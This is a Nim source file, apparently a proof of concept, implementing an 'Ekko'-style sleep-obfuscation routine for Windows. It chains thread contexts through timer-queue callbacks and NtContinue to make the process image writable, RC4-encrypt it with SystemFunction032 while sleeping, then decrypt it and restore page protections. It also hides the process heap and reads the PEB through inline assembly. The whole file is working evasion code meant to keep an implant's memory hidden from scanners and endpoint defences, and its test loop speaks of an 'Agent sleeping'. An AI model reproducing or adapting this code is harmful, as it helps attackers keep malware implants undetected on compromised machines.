#[
    Improved Ekko sleep with page-protection restoration.
    -Nb
]#

import winim
import nimjaStructs

proc rollXor*(pkey: ptr array[25, byte], p: ptr UncheckedArray[byte], cb: int) =
    for i in 0..cb-1:
        p[i] = p[i] xor pkey[(i mod (25))]

# This is only going to work on x64
{.passC:"-masm=intel".}
proc GetTEB*(): ptr NIMJA_TEB {.asmNoStackFrame.} =
    asm """
        push rbx
        xor rbx,rbx
        xor rax,rax
        mov rbx, qword ptr gs:[0x30]
        mov rax, rbx
        pop rbx
        ret
    """

# Its Ekko, but it restores memory permissions so you don't end up with a blob of RWX memory...
proc ekkoProtect(sleepTime: DWORD, NtContinue: PVOID, SysFunc032: PVOID, WinCopyMemory: PVOID, keyBuf: array[16, byte])  = # The key needs to be passed on the stack - otherwise the heap encrpytion blasts it
    var
        CtxThread: CONTEXT = CONTEXT()

        hTimerQueue: HANDLE = cast[HANDLE](NULL)
        hNewTimer: HANDLE = cast[HANDLE](NULL)
        hEvent: HANDLE = cast[HANDLE](NULL)

        ImageBase: PVOID = nil
        ImageSize: DWORD = 0
        CodeBaseRVA: DWORD = 0
        CodeSize: DWORD = 0
        OldProtect: DWORD = 0

        # USTRINGS passed to the SysFunc032 function
        Key: USTRING
        Img: USTRING

        hHeap: HANDLE = HeapCreate(0,0,0) # 'Safe' heap needs to be created after calling GetProcessHeaps so we don't xor our own data

        pKey: ptr array[16, byte] = cast[ptr array[16, byte]](HeapAlloc(hHeap, 0, (16).SIZE_T))

    defer:
        HeapDestroy(hHeap)
        CloseHandle(hTimerQueue)
        CloseHandle(hNewTimer)
        CloseHandle(hEvent)

    # Copy Key to heap
    pKey[] = keyBuf

    # Get TEB ptr
    var pTEB: ptr NIMJA_TEB = GetTEB()
    var pPEB: ptr NIMJA_PEB = pTEB[].ProcessEnvironmentBlock
    
    var
        hDefHeap: HANDLE = pPEB[].ProcessHeaps[0]
    pPEB[].ProcessHeaps[0] = cast[HANDLE](0)
    defer: pPEB[].ProcessHeaps[0] = hDefHeap

    # Get ImageBase and ImageSize
    ImageBase = cast[PVOID](pPEB[].ImageBaseAddress) #GetModuleHandle(cast[LPCWSTR](0)))
    ImageSize = cast[PIMAGE_NT_HEADERS](cast[DWORD64](ImageBase) + cast[PIMAGE_DOS_HEADER](ImageBase).e_lfanew.DWORD64).OptionalHeader.SizeOfImage

    # Count MBIs
    var
        segPtr = cast[PVOID](ImageBase)
        mbi: MEMORY_BASIC_INFORMATION
        mbiCount: int = 0
    while (not (cast[DWORD64](segPtr).int >= cast[DWORD64](ImageBase).int + cast[DWORD](ImageSize).int)) and VirtualQuery(segPtr, addr mbi, sizeof(MEMORY_BASIC_INFORMATION).SIZE_T).int.bool:
        mbiCount += 1
        segPtr = cast[PVOID](cast[DWORD64](segPtr) + mbi.RegionSize.DWORD64)

    # Allocate space for MBIs on safe heap
    var mbis: ptr UncheckedArray[MEMORY_BASIC_INFORMATION] = cast[ptr UncheckedArray[MEMORY_BASIC_INFORMATION]](HeapAlloc(hHeap, 0, (sizeof(MEMORY_BASIC_INFORMATION) * (mbiCount+1)).SIZE_T))

    # Read all memory segments onto our safe heap
    mbiCount = 0
    segPtr = cast[PVOID](ImageBase)
    while (not (cast[DWORD64](segPtr).int >= cast[DWORD64](ImageBase).int + cast[DWORD](ImageSize).int)) and VirtualQuery(segPtr, addr mbi, sizeof(MEMORY_BASIC_INFORMATION).SIZE_T).int.bool:
        mbis[mbiCount] = mbi # save mbi for later
        if mbi.Protect  == PAGE_EXECUTE_WRITECOPY: mbis[mbiCount].Protect = PAGE_EXECUTE_READWRITE
        if mbi.Protect  == PAGE_WRITECOPY: mbis[mbiCount].Protect = PAGE_READWRITE
        mbiCount += 1
        segPtr = cast[PVOID](cast[DWORD64](segPtr) + mbi.RegionSize.DWORD64) # incrementing the segPtr by the region size gets us to the base of the next region

    hEvent = CreateEvent(cast[LPSECURITY_ATTRIBUTES](0), cast[WINBOOL](0), cast[WINBOOL](0), cast[LPCWSTR](0))
    hTimerQueue = CreateTimerQueue()

    CodeBaseRVA = cast[PIMAGE_NT_HEADERS](cast[DWORD64](ImageBase) + (cast[PIMAGE_DOS_HEADER](ImageBase).e_lfanew).DWORD).OptionalHeader.BaseOfCode
    CodeSize = cast[PIMAGE_NT_HEADERS](cast[DWORD64](ImageBase) + cast[PIMAGE_DOS_HEADER](ImageBase).e_lfanew.DWORD).OptionalHeader.SizeOfCode

    Key.Buffer = cast[PWCHAR](pKey)
    Key.Length = 16
    Key.MaximumLength = 16

    Img.Buffer = cast[PWCHAR](ImageBase)
    Img.Length = ImageSize.DWORD
    Img.MaximumLength = ImageSize.DWORD

    if CreateTimerQueueTimer(addr hNewTimer, hTimerQueue, cast[WAITORTIMERCALLBACK](RtlCaptureContext), addr CtxThread, 0, 0, WT_EXECUTEINTIMERTHREAD):
        WaitForSingleObject(hEvent, 0x52) # race condition - I'm not fixing it for this poc...
        var
            index: int = 0
            numCtxs: int = 4 +
                mbiCount +
                1
            ctxs: ptr UncheckedArray[CONTEXT] = cast[ptr UncheckedArray[CONTEXT]](HeapAlloc(hHeap, 0, (sizeof(CONTEXT) * numCtxs).SIZE_T))

        # TODO: make this a map function before release - it looks nicer :)   `.mapIt()`
        for i in 0..(numCtxs - 1):
            ctxs[i] = CONTEXT()
            copyMem(addr ctxs[i], addr CtxThread, sizeof(CONTEXT))
        
        #RopProtRW - image memory regions blobify as RW for proper encryption
        # VirtualProtect(ImageBase, ImageSize, PAGE_READWRITE, addr OldProtect);
        ctxs[index].Rsp -= 8
        ctxs[index].Rip = cast[SIZE_T](winbase.VirtualProtect)
        ctxs[index].Rcx = cast[SIZE_T](ImageBase)
        ctxs[index].Rdx = ImageSize.SIZE_T
        ctxs[index].R8 = PAGE_READWRITE
        ctxs[index].R9 = cast[SIZE_T](addr OldProtect)
        index += 1

        #RopMemEnc - image encrypt
        # SystemFunction032(addr Key, addr Img);
        ctxs[index].Rsp -= 8
        ctxs[index].Rip = cast[SIZE_T](SysFunc032)
        ctxs[index].Rcx = cast[SIZE_T](addr Img)
        ctxs[index].Rdx = cast[SIZE_T](addr Key)
        index += 1

        #RopDelay
        # sleep(sleepTime);
        ctxs[index].Rsp -= 8
        ctxs[index].Rip = cast[SIZE_T](winbase.Sleep)
        ctxs[index].Rcx = sleepTime
        index += 1

        #RopMemDec - image decrypt
        # SystemFunction032(addr Key, addr Img);
        ctxs[index].Rsp -= 8
        ctxs[index].Rip = cast[SIZE_T](SysFunc032)
        ctxs[index].Rcx = cast[SIZE_T](addr Img)
        ctxs[index].Rdx = cast[SIZE_T](addr Key)
        index += 1

        # VirtualProtect(ImageBase, ImageSize, PAGE_EXECUTE_READWRITE, addr OldProtect);
        for i in 0..(mbiCount-1):
            ctxs[index].Rsp -= 8
            ctxs[index].Rip = cast[SIZE_T](winbase.VirtualProtect)
            ctxs[index].Rcx = cast[SIZE_T](mbis[i].BaseAddress)
            ctxs[index].Rdx = cast[SIZE_T](mbis[i].RegionSize)
            ctxs[index].R8 = mbis[i].Protect
            ctxs[index].R9 = cast[SIZE_T](addr OldProtect)
            index += 1

        # SetEvent(hEvent);
        ctxs[index].Rsp -= 8
        ctxs[index].Rip = cast[SIZE_T](SetEvent)
        ctxs[index].Rcx = cast[SIZE_T](hEvent)
        index += 1

        for i in 0..(numCtxs-1):
            CreateTimerQueueTimer(addr hNewTimer, hTimerQueue, cast[WAITORTIMERCALLBACK](NtContinue), addr ctxs[i], (((i+1)*200)).DWORD, 0, WT_EXECUTEINTIMERTHREAD)

        WaitForSingleObject(hEvent, INFINITE)
        
    DeleteTimerQueue(hTimerQueue)

when isMainModule:
    var
        NtContinue: PVOID = GetProcAddress(GetModuleHandleA("Ntdll"), "NtContinue")
        SysFunc032: PVOID = GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032")
        WinCopyMemory: PVOID = GetProcAddress(GetModuleHandleA("Kernel32"), "CopyMemory")

    block loop:
        while true:
            echo "[*] check mem layout and hit a key to sleep for 10 (ctrl-c to quit)"
            discard readline(stdin)
            echo "[*] Agent sleeping..."
            ekkoProtect(10 * 1000, NtContinue, SysFunc032, WinCopyMemory, [byte 0xDE, 0xAD, 0xBE, 0xEF, 0xDE, 0xAD, 0xBE, 0xEF, 0xDE, 0xAD, 0xBE, 0xEF, 0xDE, 0xAD, 0xBE, 0xEF])
            echo "[*] Done!"
            